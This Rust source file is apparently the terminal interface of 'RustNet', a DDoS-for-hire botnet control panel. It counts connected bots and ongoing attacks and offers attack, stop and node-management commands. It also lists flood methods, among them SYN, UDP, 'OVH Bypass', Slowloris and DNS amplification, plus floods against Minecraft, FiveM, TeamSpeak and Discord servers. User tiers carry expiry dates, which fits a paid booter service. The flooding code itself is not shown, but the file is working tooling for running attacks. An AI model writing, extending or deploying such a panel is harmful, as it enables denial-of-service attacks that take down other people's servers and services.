use std::sync::Arc;
use std::time::Duration;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::error::Result;
use crate::modules::auth::Level;
use super::ui::*;
pub async fn render_status_bar(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    let max_attacks = state.config.read().await.max_attacks;
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    let breadcrumb = client.get_breadcrumb().await;
    let width = get_terminal_width(state).await;
    let height = get_terminal_height(state).await;
    client.write(format!("\x1b[{};1H", height - 1).as_bytes()).await?;
    let uptime_str = if days > 0 {
        format!("{}d {}h", days, hours)
    } else if hours > 0 {
        format!("{}h {}m", hours, minutes)
    } else {
        format!("{}m", minutes)
    };
    let status_right = format!(
        "\x1b[38;5;39m[N:\x1b[38;5;51m{}\x1b[38;5;39m][U:\x1b[38;5;51m{}\x1b[38;5;39m][A:\x1b[38;5;51m{}/{}\x1b[38;5;39m][Up:\x1b[38;5;51m{}\x1b[38;5;39m]\x1b[0m",
        bot_count, client_count, attack_count, max_attacks, uptime_str
    );
    let breadcrumb_display = format!("\x1b[38;5;51m→ {}\x1b[0m", breadcrumb);
    let breadcrumb_len = breadcrumb.len() + 2; 
    let status_len = format!("[N:{}][U:{}][A:{}/{}][Up:{}]", bot_count, client_count, attack_count, max_attacks, uptime_str).len();
    let padding = if breadcrumb_len + status_len + 1 < width {
        width - breadcrumb_len - status_len
    } else {
        1
    };
    client.write(format!(
        "{}{:width$}{}\x1b[K\r",
        breadcrumb_display,
        "",
        status_right,
        width = padding
    ).as_bytes()).await?;
    Ok(())
}
pub async fn show_prompt(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    render_status_bar(client, state).await?;
    let height = get_terminal_height(state).await;
    client.write(format!("\x1b[{};1H", height).as_bytes()).await?; 
    client.write(b"\x1b[K").await?;    
    client.write(b"[\x1b[38;5;51mRustNet\x1b[0m]> ").await?;
    Ok(())
}
pub async fn handle_help_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Command Reference");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let commands = [
        ("help", "Show this reference"),
        ("attack", "Launch an attack"),
        ("methods", "Show attack methods"),
        ("ongoing", "Show ongoing attacks"),
        ("stop", "Stop an attack"),
        ("stats", "Show system metrics"),
        ("online", "Show active sessions"),
        ("whoami", "Show your information"),
        ("rules", "Show usage policy"),
        ("version", "Show server version"),
        ("dashboard", "Show main dashboard"),
        ("uptime", "Show server uptime"),
        ("gif", "List or play GIFs"),
        ("clear", "Clear the screen"),
        ("exit", "Disconnect from server")
    ];
    for (cmd, desc) in commands.iter() {
        let cmd_gradient = apply_gradient(cmd, 39, 51);
        client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", cmd_gradient, desc).as_bytes()).await?;
    }
    let user_level = client.user.get_level();
    if user_level >= Level::Admin {
        client.write(b"\n\r").await?;
        let admin_title = apply_ice_gradient("Administrative Controls");
        client.write(format!("  {}\n\r", admin_title).as_bytes()).await?;
        client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
        let admin_cmds = [
            ("users", "Manage users"),
            ("nodes", "Manage nodes"),
            ("broadcast", "Send system alert"),
            ("disconnect", "Disconnect a user")
        ];
        for (cmd, desc) in admin_cmds.iter() {
            let cmd_gradient = apply_gradient(cmd, 196, 202);
            client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", cmd_gradient, desc).as_bytes()).await?;
        }
    }
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > Help").await;
    show_prompt(client, state).await?;
    Ok(())
}
pub async fn handle_stats_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("System Metrics");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let bot_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mNodes Connected : \x1b[0m{}\n\r", bot_gradient).as_bytes()).await?;
    let client_gradient = apply_gradient(&client_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mUsers Connected : \x1b[0m{}\n\r", client_gradient).as_bytes()).await?;
    let attack_gradient = apply_fire_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks));
    client.write(format!("  \x1b[38;5;245mOngoing Attacks : \x1b[0m{}\n\r", attack_gradient).as_bytes()).await?;
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > System Metrics").await;
    Ok(())
}
pub async fn handle_health_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    let status = if bot_count > 0 && client_count > 0 { "HEALTHY" } else { "DEGRADED" };
    let status_color = if status == "HEALTHY" { 51 } else { 39 };
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("System Health Check");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let status_gradient = apply_gradient(status, status_color, status_color + 6);
    client.write(format!("  \x1b[38;5;245mSystem Status   : \x1b[0m{}\n\r", status_gradient).as_bytes()).await?;
    let uptime_str = format!("{}d {}h {}m", days, hours, minutes);
    let uptime_gradient = apply_gradient(&uptime_str, 39, 51);
    client.write(format!("  \x1b[38;5;245mSystem Uptime   : \x1b[0m{}\n\r", uptime_gradient).as_bytes()).await?;
    let bots_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mNodes Online    : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
    let clients_gradient = apply_gradient(&client_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mClients Online  : \x1b[0m{}\n\r", clients_gradient).as_bytes()).await?;
    let attacks_gradient = apply_gradient(&attack_count.to_string(), 39, 51);
    client.write(format!("  \x1b[38;5;245mOngoing Attacks : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > Health Check").await;
    Ok(())
}
pub async fn handle_online_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let clients = state.client_manager.get_all_clients().await;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Active Sessions");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    if clients.is_empty() {
        client.write(b"  \x1b[38;5;245mNo active sessions\x1b[0m\n\r").await?;
    } else {
        for c in clients.iter() {
            let level_color = match c.user.get_level() {
                Level::Owner => 196,
                Level::Admin => 202,
                Level::Pro => 87,
                Level::Basic => 195,
            };
            let indicator = if c.id == client.id { "●" } else { "○" };
            let username_gradient = apply_gradient(&c.user.username, level_color, level_color + 6);
            let addr_display = &c.address[..c.address.len().min(22)];
            let addr_gradient = apply_gradient(addr_display, 39, 45);
            client.write(format!("  \x1b[38;5;240m{} \x1b[0m{} \x1b[38;5;240m[\x1b[0m{}\x1b[38;5;240m]\x1b[0m\n\r", 
                indicator, username_gradient, addr_gradient).as_bytes()).await?;
        }
    }
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mTotal Sessions: \x1b[38;5;39m{}\x1b[0m\n\r", clients.len()).as_bytes()).await?;
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > Active Sessions").await;
    Ok(())
}
pub async fn handle_whoami_command(client: &Arc<Client>, _state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Your Information");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let level_color = match client.user.get_level() {
        Level::Owner => 39,
        Level::Admin => 45,
        Level::Pro => 87,
        Level::Basic => 195,
    };
    let username_gradient = apply_gradient(&client.user.username, 33, 51);
    let level_gradient = apply_gradient(client.user.get_level().to_str(), level_color, level_color + 6);
    let expire_str = client.user.expire.format("%Y-%m-%d %H:%M").to_string();
    client.write(format!("  \x1b[38;5;245mUsername : \x1b[0m{}\n\r", username_gradient).as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mLevel    : \x1b[0m{}\n\r", level_gradient).as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mAddress  : \x1b[38;5;39m{}\x1b[0m\n\r", client.address).as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mExpires  : \x1b[38;5;39m{}\x1b[0m\n\r", expire_str).as_bytes()).await?;
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > User Info").await;
    Ok(())
}
pub async fn handle_uptime_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    let seconds = uptime.as_secs() % 60;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Server Uptime");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let days_str = apply_gradient(&format!("{}d", days), 39, 45);
    let hours_str = apply_gradient(&format!("{}h", hours), 45, 51);
    let minutes_str = apply_gradient(&format!("{}m", minutes), 51, 87);
    let seconds_str = apply_gradient(&format!("{}s", seconds), 87, 195);
    client.write(format!("  \x1b[38;5;245mUptime : \x1b[0m{} {} {} {}\n\r", 
        days_str, hours_str, minutes_str, seconds_str).as_bytes()).await?;
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > Server Uptime").await;
    Ok(())
}
pub async fn handle_gif_command(client: &Arc<Client>, _state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    use tokio::io::AsyncBufReadExt;
    use std::path::Path;
    let gifs_dir = Path::new("data/gifs");
    if !gifs_dir.exists() {
        client.write(b"\x1b[38;5;196m[X] GIFs directory not found (data/gifs)\n\r").await?;
        return Ok(());
    }
    if parts.len() < 2 {
        let mut entries = tokio::fs::read_dir(gifs_dir).await?;
        let mut files: Vec<String> = Vec::new();
        while let Some(entry) = entries.next_entry().await? {
            let fi = entry.file_name().to_string_lossy().to_string();
            if fi.ends_with(".tfx") {
                files.push(fi);
            }
        }
        if files.is_empty() {
            client.write(b"\x1b[38;5;245mNo GIF files found\x1b[0m\n\r").await?;
            return Ok(());
        }
        client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
        let title = apply_ice_gradient("Available GIFs");
        client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
        client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
        for (i, f) in files.iter().enumerate() {
            let index_gradient = apply_gradient(&format!("{}.", i + 1), 245, 250);
            let file_gradient = apply_gradient(f, 39, 51);
            client.write(format!("  {} {}\n\r", index_gradient, file_gradient).as_bytes()).await?;
        }
        client.write(b"\n\r").await?;
        return Ok(());
    }
    let mut filename = parts[1].to_string();
    if !filename.ends_with(".tfx") {
        filename.push_str(".tfx");
    }
    let base = Path::new(&filename)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(&filename);
    let path = gifs_dir.join(base);
    if tokio::fs::metadata(&path).await.is_err() {
        client.write(b"\x1b[38;5;196m[X] GIF file not found\n\r").await?;
        return Ok(());
    }
    let file = tokio::fs::File::open(&path).await?;
    let reader = tokio::io::BufReader::new(file);
    let mut lines = reader.lines();
    client.write(b"\x1b[2J\x1b[3J\x1b[H\x1b[?25l").await?;
    let mut buffer: Vec<u8> = Vec::with_capacity(4096);
    while let Some(line) = lines.next_line().await? {
        let l = line.trim_end_matches(&['\r', '\n'][..]).to_string();
        if l.contains("\x1b[") {
            buffer.extend_from_slice(l.as_bytes());
            buffer.extend_from_slice(b"\r\n");
            if buffer.len() > 2048 {
                client.write(buffer.as_slice()).await?;
                buffer.clear();
            }
        } else {
            if !buffer.is_empty() {
                client.write(buffer.as_slice()).await?;
                buffer.clear();
            }
            client.write(format!("{}\r\n", l).as_bytes()).await?;
        }
        tokio::time::sleep(Duration::from_millis(2)).await;
    }
    if !buffer.is_empty() {
        client.write(buffer.as_slice()).await?;
    }
    client.write(b"\x1b[?25h").await?;
    tokio::time::sleep(Duration::from_millis(500)).await;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    Ok(())
}
pub async fn handle_methods_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Attack Methods");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let l4_methods = [
        ("UDP", "UDP Load"),
        ("UDPMAX", "UDP Max Load (MTU)"),
        ("TCP", "TCP Load"),
        ("SYN", "SYN Load"),
        ("ACK", "ACK Load"),
        ("ICMP", "ICMP Load"),
        ("GRE", "GRE Load"),
        ("CONNECTION", "TCP Connection Exhaustion"),
        ("VSE", "Valve Source Engine"),
        ("OVH", "OVH Bypass")
    ];
    let l7_methods = [
        ("HTTP", "HTTP Load"),
        ("UA-HTTP", "HTTP UA Bypass"),
        ("SLOWLORIS", "Slowloris Attack"),
        ("STRESS", "HTTP Stress Test"),
        ("DNS", "DNS Load"),
        ("WEBSOCKET", "WebSocket Load"),
        ("TLS", "SSL/TLS Load"),
        ("AMPLIFICATION", "DNS Amplification")
    ];
    let game_methods = [
        ("MINECRAFT", "Minecraft Server Load"),
        ("RAKNET", "RakNet Load (MCPE/Terraria)"),
        ("FIVEM", "FiveM Server Load"),
        ("TS3", "TeamSpeak 3 Load"),
        ("DISCORD", "Discord Voice Load"),
        ("SIP", "SIP VOIP Load")
    ];
    client.write(b"  \x1b[38;5;39mLayer 4 Vectors\x1b[0m\n\r").await?;
    for (name, desc) in l4_methods.iter() {
        let name_gradient = apply_gradient(name, 39, 51);
        client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
    }
    let l7_title = apply_fire_gradient("Layer 7 Vectors");
    client.write(format!("\n\r  {}\n\r", l7_title).as_bytes()).await?;
    for (name, desc) in l7_methods.iter() {
        let name_gradient = apply_gradient(name, 196, 220);
        client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
    }
    let game_title = apply_gradient("Application Specific Vectors", 220, 226);
    client.write(format!("\n\r  {}\n\r", game_title).as_bytes()).await?;
    for (name, desc) in game_methods.iter() {
        let name_gradient = apply_gradient(name, 220, 226);
        client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
    }
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > Attack Methods").await;
    show_prompt(client, state).await?;
    Ok(())
}
pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    let attacks = state.attack_manager.get_all_attacks().await;
    let user_attacks = state.attack_manager.get_user_attacks(&client.user.username).await;
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("RustNet Security Framework");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let status = if bot_count > 0 && client_count > 0 { 
        apply_gradient("HEALTHY", 51, 87)
    } else {
        apply_gradient("DEGRADED", 39, 45)
    };
    client.write(format!("  \x1b[38;5;245mSystem Status   : \x1b[0m{}\n\r", status).as_bytes()).await?;
    let uptime_str = format!("{}d {}h {}m", days, hours, minutes);
    let uptime_gradient = apply_gradient(&uptime_str, 39, 51);
    client.write(format!("  \x1b[38;5;245mSystem Uptime   : \x1b[0m{}\n\r", uptime_gradient).as_bytes()).await?;
    let bots_gradient = apply_gradient(&format!("{}/{}", bot_count, state.config.read().await.max_bot_connections), 39, 51);
    client.write(format!("  \x1b[38;5;245mConnected Nodes : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
    let users_gradient = apply_gradient(&format!("{}/{}", client_count, state.config.read().await.max_user_connections), 39, 51);
    client.write(format!("  \x1b[38;5;245mConnected Users : \x1b[0m{}\n\r", users_gradient).as_bytes()).await?;
    let attacks_gradient = apply_fire_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks));
    client.write(format!("  \x1b[38;5;245mOngoing Attacks : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
    client.write(b"\n\r").await?;
    let active_title = apply_fire_gradient("Ongoing Attacks");
    client.write(format!("  {}\n\r", active_title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    if attacks.is_empty() {
        client.write(b"  \x1b[38;5;245mNo ongoing attacks running\x1b[0m\n\r").await?;
    } else {
        for attack in attacks.iter().take(5) {
            let remaining = attack.remaining_duration().as_secs();
            let method_color = match attack.method.as_str() {
                m if m.contains("slow") => 39,
                m if m.contains("ssl") => 45,
                m if m.contains("http") || m.contains("websocket") => 51,
                m if m.contains("udp") => 87,
                _ => 195
            };
            let method_gradient = apply_gradient(&attack.method.trim_start_matches('!'), method_color, method_color + 6);
            let target_gradient = apply_gradient(&format!("{}:{}", attack.ip, attack.port), 245, 250);
            let time_gradient = apply_gradient(&format!("{}s", remaining), 51, 57);
            client.write(format!("  \x1b[38;5;240m[\x1b[0m{}\x1b[38;5;240m] \x1b[0m{} \x1b[38;5;240m-> \x1b[0m{}\n\r", 
                time_gradient, method_gradient, target_gradient).as_bytes()).await?;
        }
        if attacks.len() > 5 {
            client.write(format!("  \x1b[38;5;245m... and {} more attacks\x1b[0m\n\r", attacks.len() - 5).as_bytes()).await?;
        }
    }
    client.write(b"\n\r").await?;
    let user_title = apply_fire_gradient("Your Activity");
    client.write(format!("  {}\n\r", user_title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let user_attacks_gradient = apply_fire_gradient(&user_attacks.len().to_string());
    client.write(format!("  \x1b[38;5;245mYour Ongoing Attacks: \x1b[0m{}\n\r", user_attacks_gradient).as_bytes()).await?;
    client.write(b"\n\r").await?;
    Ok(())
}
pub async fn handle_version_command(client: &Arc<Client>, _state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Server Version");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let version = apply_gradient(env!("CARGO_PKG_VERSION"), 39, 51);
    let author = apply_gradient("RustNet Team", 51, 87);
    client.write(format!("  \x1b[38;5;245mVersion : \x1b[0m{}\n\r", version).as_bytes()).await?;
    client.write(format!("  \x1b[38;5;245mAuthor  : \x1b[0m{}\n\r", author).as_bytes()).await?;
    client.write(b"  \x1b[38;5;245mLicense : \x1b[0mMIT\n\r").await?;
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > Version").await;
    Ok(())
}
pub async fn handle_rules_command(client: &Arc<Client>, _state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_ice_gradient("Usage Policy");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let rules = [
        "Do not attack government websites",
        "Do not attack educational institutions",
        "Do not attack hospitals or medical facilities",
        "Respect other users",
        "No spamming in chat"
    ];
    for (i, rule) in rules.iter().enumerate() {
        let index_gradient = apply_gradient(&format!("{}.", i + 1), 245, 250);
        let rule_gradient = apply_gradient(rule, 39, 51);
        client.write(format!("  {} {}\n\r", index_gradient, rule_gradient).as_bytes()).await?;
    }
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > Usage Policy").await;
    Ok(())
}
